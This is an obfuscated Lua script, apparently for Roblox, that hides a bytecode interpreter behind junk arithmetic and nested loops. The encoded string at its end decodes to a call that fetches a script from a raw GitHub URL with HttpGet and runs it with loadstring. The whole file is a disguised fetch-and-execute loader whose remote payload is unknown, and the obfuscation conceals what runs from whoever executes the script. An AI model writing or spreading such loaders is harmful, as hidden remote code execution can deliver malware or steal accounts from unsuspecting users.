do
	local v0 = tonumber;
	local v1 = string.byte;
	local v2 = string.char;
	local v3 = string.sub;
	local v4 = string.gsub;
	local v5 = string.rep;
	local v6 = table.concat;
	local v7 = table.insert;
	local v8 = math.ldexp;
	local v9 = getfenv or function()
		return _ENV;
	end;
	local v10 = setmetatable;
	local v11 = pcall;
	local v12 = select;
	local v13 = unpack or table.unpack;
	local v14 = tonumber;
	local function v15(v16, v17, ...)
		local v18 = 1;
		local v19;
		v16 = v4(v3(v16, 5), "..", function(v30)
			if (v1(v30, 2) == 79) then
				local v82 = 0;
				while true do
					if (v82 == 0) then
						v19 = v0(v3(v30, 1, 1));
						return "";
					end
				end
			else
				local v83 = v2(v0(v30, 16));
				if v19 then
					local v88 = v5(v83, v19);
					v19 = nil;
					return v88;
				else
					return v83;
				end
			end
		end);
		local function v20(v31, v32, v33)
			if v33 then
				local v84 = (v31 / ((5 - 3) ^ (v32 - (2 - 1)))) % (((1 + 2) - 1) ^ (((v33 - (2 - 1)) - (v32 - (620 - (555 + 64)))) + (932 - (857 + 74))));
				return v84 - (v84 % 1);
			else
				local v85 = (570 - ((1244 - (282 + 595)) + 201)) ^ (v32 - 1);
				return (((v31 % (v85 + v85)) >= v85) and (928 - (214 + 713))) or (0 + 0);
			end
		end
		local function v21()
			local v34 = 1637 - (1523 + 114);
			local v35;
			while true do
				if (v34 == (1 + 0)) then
					return v35;
				end
				if (v34 == (0 - 0)) then
					v35 = v1(v16, v18, v18);
					v18 = v18 + (1066 - (68 + 997));
					v34 = (5534 - 4263) - (226 + (1161 - (32 + 85)));
				end
			end
		end
		local function v22()
			local v36, v37 = v1(v16, v18, v18 + 2 + 0);
			v18 = v18 + 1 + 1;
			return (v37 * (1213 - (892 + 65))) + v36;
		end
		local function v23()
			local v38, v39, v40, v41 = v1(v16, v18, v18 + (7 - 4));
			v18 = v18 + (6 - 2);
			return (v41 * (30800116 - 14022900)) + (v40 * (65886 - (64 + 23 + 263))) + (v39 * (436 - (67 + 113))) + v38;
		end
		local function v24()
			local v42 = v23();
			local v43 = v23();
			local v44 = 2 - 1;
			local v45 = (v20(v43, 1 + 0, 15 + 5) * (((1145 - (116 + 1022)) - (20 - 15)) ^ ((578 + 406) - (802 + 150)))) + v42;
			local v46 = v20(v43, 39 - (10 + 8), 83 - 52);
			local v47 = ((v20(v43, 474 - (416 + 26)) == (3 - (7 - 5))) and -(1 - 0)) or (1 + 0);
			if (v46 == (997 - (915 + 82))) then
				if (v45 == (0 - 0)) then
					return v47 * (430 - (44 + 386));
				else
					v46 = 1 + 0;
					v44 = 0 - 0;
				end
			elseif (v46 == (3234 - (1069 + 118))) then
				return ((v45 == ((0 - 0) - 0)) and (v47 * ((1 + 0) / 0))) or (v47 * NaN);
			end
			return v8(v47, v46 - (2237 - 1214)) * (v44 + (v45 / ((1 + 1) ^ ((951 - (814 + 45)) - 40))));
		end
		local function v25(v48)
			local v49;
			if not v48 then
				v48 = v23();
				if (v48 == (0 + 0)) then
					return "";
				end
			end
			v49 = v3(v16, v18, (v18 + v48) - (2 - 1));
			v18 = v18 + v48;
			local v50 = {};
			for v66 = 1 + 0, #v49 do
				v50[v66] = v2(v1(v3(v49, v66, v66)));
			end
			return v6(v50);
		end
		local v26 = v23;
		local function v27(...)
			return {...}, v12("#", ...);
		end
		local function v28()
			local v51 = 0 + 0;
			local v52;
			local v53;
			local v54;
			local v55;
			local v56;
			local v57;
			local v58;
			local v59;
			while true do
				if (1 ~= v51) then
				else
					v54 = nil;
					v55 = nil;
					v51 = 2;
				end
				if (v51 == (1458 - (282 + 1174))) then
					v56 = nil;
					v57 = nil;
					v51 = 814 - (569 + 242);
				end
				if (v51 == 3) then
					v58 = nil;
					v59 = nil;
					v51 = 11 - 7;
				end
				if (v51 == 0) then
					v52 = 0 + 0;
					v53 = nil;
					v51 = 1025 - (706 + 318);
				end
				if (v51 == (1255 - (721 + 530))) then
					while true do
						if (v52 == (1271 - (945 + 326))) then
							local v95 = 0 - 0;
							local v96;
							while true do
								if (v95 == (0 + 0)) then
									v96 = 0;
									while true do
										if (0 == v96) then
											v53 = 700 - (271 + 429);
											v54 = nil;
											v96 = 1 + 0;
										end
										if (v96 == (1501 - (1408 + 92))) then
											v52 = 1087 - (461 + 625);
											break;
										end
									end
									break;
								end
							end
						end
						if (v52 == (1291 - (993 + 295))) then
							v59 = nil;
							while true do
								local v99 = 0 + 0;
								local v100;
								while true do
									if (v99 == (1171 - (418 + 753))) then
										v100 = 0;
										while true do
											if (v100 == 1) then
												if (v53 ~= (0 + 0)) then
												else
													local v143 = 0 + 0;
													local v144;
													local v145;
													while true do
														if (v143 == 1) then
															while true do
																if (v144 == 0) then
																	v145 = 0 + 0;
																	while true do
																		if (v145 == 0) then
																			local v157 = 0 + 0;
																			while true do
																				if (v157 == (529 - (406 + 123))) then
																					v54 = {};
																					v55 = {};
																					v157 = 1;
																				end
																				if (v157 == 1) then
																					v145 = 1;
																					break;
																				end
																			end
																		end
																		if (v145 ~= 2) then
																		else
																			v53 = 1;
																			break;
																		end
																		if (v145 == (1770 - (1749 + 20))) then
																			local v158 = 0;
																			while true do
																				if (v158 == 0) then
																					v56 = {};
																					v57 = {v54,v55,nil,v56};
																					v158 = 1323 - (1249 + 73);
																				end
																				if (v158 == (1 + 0)) then
																					v145 = 1147 - (466 + 679);
																					break;
																				end
																			end
																		end
																	end
																	break;
																end
															end
															break;
														end
														if (v143 ~= (0 - 0)) then
														else
															v144 = 0 - 0;
															v145 = nil;
															v143 = 1;
														end
													end
												end
												break;
											end
											if ((1900 - (106 + 1794)) == v100) then
												local v124 = 0;
												while true do
													if (v124 ~= (1 + 0)) then
													else
														v100 = 1 + 0;
														break;
													end
													if (v124 == 0) then
														if (v53 == (2 - 1)) then
															local v151 = 0 - 0;
															local v152;
															while true do
																if (v151 == 0) then
																	v152 = 0;
																	while true do
																		if (v152 == (116 - (4 + 110))) then
																			v53 = 586 - (57 + 527);
																			break;
																		end
																		if ((1428 - (41 + 1386)) ~= v152) then
																		else
																			local v159 = 0;
																			while true do
																				if (v159 ~= 1) then
																				else
																					v152 = 2;
																					break;
																				end
																				if (v159 == (103 - (17 + 86))) then
																					for v162 = 1 + 0, v58 do
																						local v163 = 0 - 0;
																						local v164;
																						local v165;
																						local v166;
																						while true do
																							if (v163 ~= 1) then
																							else
																								v166 = nil;
																								while true do
																									if (v164 == (0 - 0)) then
																										local v168 = 0;
																										local v169;
																										while true do
																											if (v168 == (166 - (122 + 44))) then
																												v169 = 0;
																												while true do
																													if (v169 == 1) then
																														v164 = 1;
																														break;
																													end
																													if (v169 ~= 0) then
																													else
																														local v182 = 0;
																														while true do
																															if (v182 ~= 1) then
																															else
																																v169 = 1 - 0;
																																break;
																															end
																															if (v182 == 0) then
																																v165 = v21();
																																v166 = nil;
																																v182 = 3 - 2;
																															end
																														end
																													end
																												end
																												break;
																											end
																										end
																									end
																									if (v164 ~= 1) then
																									else
																										if (v165 == (1 + 0)) then
																											v166 = v21() ~= (0 + 0);
																										elseif (v165 == 2) then
																											v166 = v24();
																										elseif (v165 ~= 3) then
																										else
																											v166 = v25();
																										end
																										v59[v162] = v166;
																										break;
																									end
																								end
																								break;
																							end
																							if (v163 == 0) then
																								v164 = 0 - 0;
																								v165 = nil;
																								v163 = 1;
																							end
																						end
																					end
																					v57[3] = v21();
																					v159 = 66 - (30 + 35);
																				end
																			end
																		end
																		if (v152 == (0 + 0)) then
																			local v160 = 0;
																			while true do
																				if (v160 == 1) then
																					v152 = 1258 - (1043 + 214);
																					break;
																				end
																				if (v160 == 0) then
																					v58 = v23();
																					v59 = {};
																					v160 = 3 - 2;
																				end
																			end
																		end
																	end
																	break;
																end
															end
														end
														if ((1214 - (323 + 889)) ~= v53) then
														else
															local v153 = 0 - 0;
															local v154;
															while true do
																if (v153 ~= (580 - (361 + 219))) then
																else
																	v154 = 320 - (53 + 267);
																	while true do
																		local v155 = 0 + 0;
																		local v156;
																		while true do
																			if (v155 ~= 0) then
																			else
																				v156 = 0;
																				while true do
																					if (0 == v156) then
																						if (v154 ~= (413 - (15 + 398))) then
																						else
																							local v167 = 982 - (18 + 964);
																							while true do
																								if (v167 == (3 - 2)) then
																									v154 = 1;
																									break;
																								end
																								if (v167 == (0 + 0)) then
																									for v171 = 1 + 0, v23() do
																										local v172 = 0;
																										local v173;
																										while true do
																											if (v172 ~= 0) then
																											else
																												v173 = v21();
																												if (v20(v173, 1, 1) ~= 0) then
																												else
																													local v176 = 0;
																													local v177;
																													local v178;
																													local v179;
																													local v180;
																													local v181;
																													while true do
																														if (v176 ~= (852 - (20 + 830))) then
																														else
																															v181 = nil;
																															while true do
																																if (v177 == (0 + 0)) then
																																	local v183 = 126 - (116 + 10);
																																	while true do
																																		if (1 == v183) then
																																			v177 = 1 + 0;
																																			break;
																																		end
																																		if (0 == v183) then
																																			v178 = 0;
																																			v179 = nil;
																																			v183 = 1;
																																		end
																																	end
																																end
																																if (v177 == 1) then
																																	local v184 = 738 - (542 + 196);
																																	while true do
																																		if (v184 ~= 0) then
																																		else
																																			v180 = nil;
																																			v181 = nil;
																																			v184 = 1 - 0;
																																		end
																																		if (v184 ~= 1) then
																																		else
																																			v177 = 1 + 1;
																																			break;
																																		end
																																	end
																																end
																																if ((2 + 0) == v177) then
																																	while true do
																																		if ((1 + 0) == v178) then
																																			local v185 = 0;
																																			local v186;
																																			while true do
																																				if (v185 == 0) then
																																					v186 = 0 - 0;
																																					while true do
																																						if (v186 ~= (2 - 1)) then
																																						else
																																							v178 = 2;
																																							break;
																																						end
																																						if (v186 == (1551 - (1126 + 425))) then
																																							v181 = {v22(),v22(),nil,nil};
																																							if (v179 == 0) then
																																								local v196 = 1121 - (118 + 1003);
																																								local v197;
																																								local v198;
																																								local v199;
																																								while true do
																																									if (v196 == 0) then
																																										v197 = 0;
																																										v198 = nil;
																																										v196 = 2 - 1;
																																									end
																																									if (v196 ~= 1) then
																																									else
																																										v199 = nil;
																																										while true do
																																											if (v197 == 1) then
																																												while true do
																																													if (v198 == (377 - (142 + 235))) then
																																														v199 = 0;
																																														while true do
																																															if (v199 == (0 - 0)) then
																																																v181[3] = v22();
																																																v181[4] = v22();
																																																break;
																																															end
																																														end
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																											if (v197 ~= (0 + 0)) then
																																											else
																																												local v202 = 977 - (553 + 424);
																																												while true do
																																													if (v202 == (0 - 0)) then
																																														v198 = 0;
																																														v199 = nil;
																																														v202 = 1;
																																													end
																																													if (v202 ~= (1 + 0)) then
																																													else
																																														v197 = 1 + 0;
																																														break;
																																													end
																																												end
																																											end
																																										end
																																										break;
																																									end
																																								end
																																							elseif (v179 == (1 + 0)) then
																																								v181[3] = v23();
																																							elseif (v179 == (1 + 1)) then
																																								v181[3] = v23() - ((2 + 0) ^ (34 - 18));
																																							elseif (v179 == 3) then
																																								local v203 = 0 - 0;
																																								local v204;
																																								local v205;
																																								while true do
																																									if (v203 == (2 - 1)) then
																																										while true do
																																											if ((0 + 0) == v204) then
																																												v205 = 0 - 0;
																																												while true do
																																													if (v205 == (753 - (239 + 514))) then
																																														v181[2 + 1] = v23() - (2 ^ 16);
																																														v181[1333 - (797 + 532)] = v22();
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																									if (v203 == 0) then
																																										v204 = 0;
																																										v205 = nil;
																																										v203 = 1;
																																									end
																																								end
																																							end
																																							v186 = 1 + 0;
																																						end
																																					end
																																					break;
																																				end
																																			end
																																		end
																																		if (3 == v178) then
																																			if (v20(v180, 2 + 1, 6 - 3) == (1203 - (373 + 829))) then
																																				v181[4] = v59[v181[4]];
																																			end
																																			v54[v171] = v181;
																																			break;
																																		end
																																		if (v178 ~= (731 - (476 + 255))) then
																																		else
																																			local v188 = 0;
																																			while true do
																																				if (v188 == 0) then
																																					v179 = v20(v173, 2, 1133 - (369 + 761));
																																					v180 = v20(v173, 4, 4 + 2);
																																					v188 = 1 - 0;
																																				end
																																				if (v188 == (1 - 0)) then
																																					v178 = 1;
																																					break;
																																				end
																																			end
																																		end
																																		if (v178 ~= 2) then
																																		else
																																			local v189 = 238 - (64 + 174);
																																			while true do
																																				if (v189 == (0 + 0)) then
																																					if (v20(v180, 1 - 0, 1) ~= (337 - (144 + 192))) then
																																					else
																																						v181[2] = v59[v181[2]];
																																					end
																																					if (v20(v180, 2, 2) ~= 1) then
																																					else
																																						v181[219 - (42 + 174)] = v59[v181[3]];
																																					end
																																					v189 = 1;
																																				end
																																				if (v189 == 1) then
																																					v178 = 3 + 0;
																																					break;
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																															end
																															break;
																														end
																														if (v176 == 0) then
																															v177 = 0;
																															v178 = nil;
																															v176 = 1 + 0;
																														end
																														if ((1 + 0) == v176) then
																															v179 = nil;
																															v180 = nil;
																															v176 = 1506 - (363 + 1141);
																														end
																													end
																												end
																												break;
																											end
																										end
																									end
																									for v174 = 1, v23() do
																										v55[v174 - (1581 - (1183 + 397))] = v28();
																									end
																									v167 = 2 - 1;
																								end
																							end
																						end
																						if (1 == v154) then
																							return v57;
																						end
																						break;
																					end
																				end
																				break;
																			end
																		end
																	end
																	break;
																end
															end
														end
														v124 = 1;
													end
												end
											end
										end
										break;
									end
								end
							end
							break;
						end
						if (v52 ~= (2 + 0)) then
						else
							local v97 = 0;
							while true do
								if (v97 ~= (1 + 0)) then
								else
									v52 = 1978 - (1913 + 62);
									break;
								end
								if ((0 + 0) == v97) then
									v57 = nil;
									v58 = nil;
									v97 = 2 - 1;
								end
							end
						end
						if (v52 == 1) then
							local v98 = 1933 - (565 + 1368);
							while true do
								if (v98 ~= (3 - 2)) then
								else
									v52 = 1663 - (1477 + 184);
									break;
								end
								if (v98 ~= (0 - 0)) then
								else
									v55 = nil;
									v56 = nil;
									v98 = 1 + 0;
								end
							end
						end
					end
					break;
				end
			end
		end
		local function v29(v60, v61, v62)
			local v63 = v60[1];
			local v64 = v60[2];
			local v65 = v60[3];
			return function(...)
				local v68 = v63;
				local v69 = v64;
				local v70 = v65;
				local v71 = v27;
				local v72 = 1;
				local v73 = -1;
				local v74 = {};
				local v75 = {...};
				local v76 = v12("#", ...) - 1;
				local v77 = {};
				local v78 = {};
				for v86 = 0, v76 do
					if (v86 >= v70) then
						v74[v86 - v70] = v75[v86 + 1];
					else
						v78[v86] = v75[v86 + 1];
					end
				end
				local v79 = (v76 - v70) + 1;
				local v80;
				local v81;
				while true do
					local v87 = 0;
					while true do
						if (v87 == 1) then
							if (v81 <= 3) then
								if (v81 <= 1) then
									if (v81 > 0) then
										local v101 = 0;
										local v102;
										local v103;
										local v104;
										local v105;
										local v106;
										while true do
											if (1 == v101) then
												v72 = v72 + 1;
												v80 = v68[v72];
												v78[v80[2]] = v62[v80[3]];
												v72 = v72 + 1;
												v80 = v68[v72];
												v101 = 2;
											end
											if (v101 == 2) then
												v106 = v80[2];
												v105 = v78[v80[3]];
												v78[v106 + 1] = v105;
												v78[v106] = v105[v80[4]];
												v72 = v72 + 1;
												v101 = 3;
											end
											if (5 == v101) then
												v80 = v68[v72];
												v106 = v80[2];
												v78[v106] = v78[v106](v13(v78, v106 + 1, v73));
												v72 = v72 + 1;
												v80 = v68[v72];
												v101 = 6;
											end
											if (v101 == 4) then
												v103, v104 = v71(v78[v106](v13(v78, v106 + 1, v80[3])));
												v73 = (v104 + v106) - 1;
												v102 = 0;
												for v146 = v106, v73 do
													v102 = v102 + 1;
													v78[v146] = v103[v102];
												end
												v72 = v72 + 1;
												v101 = 5;
											end
											if (v101 == 6) then
												v78[v80[2]]();
												v72 = v72 + 1;
												v80 = v68[v72];
												do
													return;
												end
												break;
											end
											if (0 == v101) then
												v102 = nil;
												v103, v104 = nil;
												v105 = nil;
												v106 = nil;
												v78[v80[2]] = v62[v80[3]];
												v101 = 1;
											end
											if (v101 == 3) then
												v80 = v68[v72];
												v78[v80[2]] = v80[3];
												v72 = v72 + 1;
												v80 = v68[v72];
												v106 = v80[2];
												v101 = 4;
											end
										end
									else
										local v107 = v80[2];
										local v108, v109 = v71(v78[v107](v13(v78, v107 + 1, v80[3])));
										v73 = (v109 + v107) - 1;
										local v110 = 0;
										for v122 = v107, v73 do
											local v123 = 0;
											while true do
												if (v123 == 0) then
													v110 = v110 + 1;
													v78[v122] = v108[v110];
													break;
												end
											end
										end
									end
								elseif (v81 > 2) then
									v78[v80[2]] = v62[v80[3]];
								else
									v78[v80[2]] = v80[3];
								end
							elseif (v81 <= 5) then
								if (v81 > 4) then
									local v115 = v80[2];
									local v116 = v78[v80[3]];
									v78[v115 + 1] = v116;
									v78[v115] = v116[v80[4]];
								else
									local v120 = v80[2];
									v78[v120] = v78[v120](v13(v78, v120 + 1, v73));
								end
							elseif (v81 > 6) then
								v78[v80[2]]();
							else
								do
									return;
								end
							end
							v72 = v72 + 1;
							break;
						end
						if (v87 == 0) then
							v80 = v68[v72];
							v81 = v80[1];
							v87 = 1;
						end
					end
				end
			end;
		end
		return v29(v28(), {}, v17)(...);
	end
	v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403943O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F6E2O6F623631363136312F524F424C4F582F6D61696E2F2O313337396B2O736B646E786E786A4149454F444A58696564574944736F645150444A2F574D586E7869717071697250514D444E5A4A5770776D2F64736B646E646A786F736F4B454F575041444E582E636F6D2E6C75612E6C756100083O0012013O00013O00122O000100023O00202O00010001000300122O000300046O000100039O0000026O000100016O00017O00", v9(), ...);
end
